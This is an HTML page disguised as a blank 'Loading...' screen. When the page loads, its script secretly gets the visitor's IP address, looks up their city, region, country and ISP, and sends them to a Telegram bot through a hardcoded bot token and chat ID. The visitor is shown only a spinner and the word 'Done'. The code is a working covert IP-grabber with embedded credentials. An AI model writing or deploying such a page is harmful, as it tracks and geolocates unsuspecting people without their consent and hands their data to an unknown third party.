<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { 
            margin: 0; 
            height: 100vh; 
            background: #111; 
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            font-family: Arial; 
            text-align: center;
        }
        .loader {
            width: 40px; 
            height: 40px; 
            border: 4px solid #333; 
            border-top-color: #0f0; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <p id="status">Loading...</p>
    </div>

    <script>
        const botToken = '8676266697:AAHdIIE5nA5O7ZkITE8b97Mu9HqM2-rO_ow';
        const chatId = '7680286319';

        async function track() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const data = await detailsResponse.json();

                const message = `📍 VISITOR LOCATION\n\n` +
                    `🌐 IP: ${ipData.ip}\n` +
                    `📍 Location: ${data.city}, ${data.region}, ${data.country_name}\n` +
                    `🏢 ISP: ${data.org || 'Unknown'}\n` +
                    `⏰ Time: ${new Date().toLocaleString()}`;

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });

                document.getElementById('status').textContent = 'Done';

            } catch (e) {
                document.getElementById('status').textContent = 'Error';
            }
        }

        window.onload = track;
    </script>
</body>
</html>
